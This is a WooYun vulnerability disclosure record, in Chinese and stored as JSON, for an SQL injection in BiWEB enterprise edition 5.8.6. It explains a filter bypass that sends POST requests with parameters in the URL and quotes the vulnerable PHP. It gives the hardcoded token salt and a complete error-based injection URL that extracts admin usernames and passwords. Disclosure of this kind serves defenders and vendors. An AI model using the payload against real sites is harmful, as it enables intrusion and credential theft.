{"id": 42438, "wybug_id": "wooyun-2014-085801", "wybug_title": "BiWEB最新企业版绕过过滤注入一枚", "wybug_corp": "BiWEB", "wybug_author": "路人甲", "wybug_date": "2014-12-04 18:03", "wybug_open_date": "2015-03-04 18:04", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-03-04：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： BiWEB最新企业版绕过过滤注入一枚 详细说明：  看到pandas提交的BiWEB的漏洞 WooYun: BIWEB企业版多处SQL注入 ，在search.php里找到了几个注入漏洞，我也来凑下热闹。去官网下BiWEB企业版最新的5.8.6来看看。注入点在http://xxx.com/emaillist/cancelmail.php?u_mail=1&token=，其中u_mail=1存在注入漏洞先来看看BiWEB是怎么处理防注入的。首先BiWEB对用户输入进行了全局过滤filtrate.inc.php\n<?php//过滤GET或POST的值，去除两端空格和转义符号if ($_SERVER['REQUEST_METHOD'] == 'POST'){\tcheck::filtrateData($_POST,$arrGPdoDB['htmlspecialchars']);}elseif($_SERVER['REQUEST_METHOD'] == 'GET'){\tcheck::filtrateData($_GET,$arrGPdoDB['htmlspecialchars']);}?>\n这个过滤方法中，如果是POST方法就只对通过POST提交的用户数据进行过滤，GET方法同理。突然就想到一个方法，REQUEST_METHOD还是 POST，但是在url中带入用户数据（GET方法），然后程序中用$_GET数组来获取数据的话，那就可以获得通过url提交的数据，并且没有经过全局 过滤，这样就绕过了全局过滤。在/emaillist/cancelmail.php中\n无关代码$objWebInit->arrGPage = $arrGPage;$objWebInit->db(); if(!empty($_GET['u_mail']) && !empty($_GET['token'])){\tif($_GET['token']==md5($_GET['u_mail'].$arrGWeb['jamstr'])){//数据匹配，则标识为退订邮件\t\t$strWhere=\" WHERE title='{$_GET['u_mail']}'\";\t\t$objWebInit->updateDataG('biweb_emaillist',array('pass'=>'7'),$strWhere);\t\techo \"<script>alert('退订成功');window.close();</script>\";exit;\t}}无关代码\n继续去看看updateDataG()，在/web_common5.8/php_common.php中\npublic function updateDataG($table,$arrData,$where=''){\t\ttry {\t\t\t$strSQL = \"\tUPDATE $table SET \";\t\t\tforeach ($arrData as $k => $v) {\t\t\t\tif(strpos($v,'fun(')!==false){\t\t\t\t\t$v = str_ireplace('fun(','(',$v);\t\t\t\t\t$strSQL .= $k.\"=\" . $v . \",\";\t\t\t\t}else\t$strSQL .= $k.\"='\" . $v . \"',\";\t\t\t}\t\t\t$strSQL = substr($strSQL, 0, -1);\t\t\t$strSQL .= ' '.$where;\t\t\tif($this->arrGPdoDB['PDO_DEBUG']) echo $strSQL.'<br><br>';\t\t\tif($result = $this->db->exec($strSQL)){\t\t\t\tif($this->arrGPdoDB['PDO_LOGS']) check::getAPI('logs','addLog',\"2^$table^$where^$strSQL\");\t\t\t\treturn $result;\t\t\t}\t\t} catch (PDOException $e) {\t\t    die('Failed: ' . $e->getMessage().'<br><br>');\t\t}\t}\n可以看出，整个过程中没有其他的过滤，只要可以绕过全局过滤，就可以注入。在/emaillist/cancelmail.php中,要满足$_GET['token']==md5($_GET['u_mail'].$arrGWeb['jamstr'])这个条件才可以执行SQL语句，这里的$arrGWeb['jamstr']是一个全局变量，值为’BIWEB88’，因此，这里只要把$_GET['u_mail']与BIWEB88连接并取其md5值赋予token提交即可。如果按正常的情况使用GET提交，单引号被全局过滤编码，如下：\n\n把GET方法改为POST提交，成功引入单引号，如下:\n\n成功注入，管理员用户名及密码如下图中所示：\n\npayload如下（POST方法提交）\nhttp://www.xxx.com/emaillist/cancelmail.php?u_mail=1'/**/or/**/(select/**/1/**/from/**/(select/**/count(*),concat(0x23,(select/**/concat(user_name,0x23,password,0x23)from/**/biweb_mcenter/**/limit/**/0,1),floor(rand(0)*2))x/**/from/**/information_schema.tables/**/group/**/by/**/x)a)or/**/'&token=e68367f5f3a54b46938651c9afa04dcb\n   漏洞证明：  见 详细说明   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}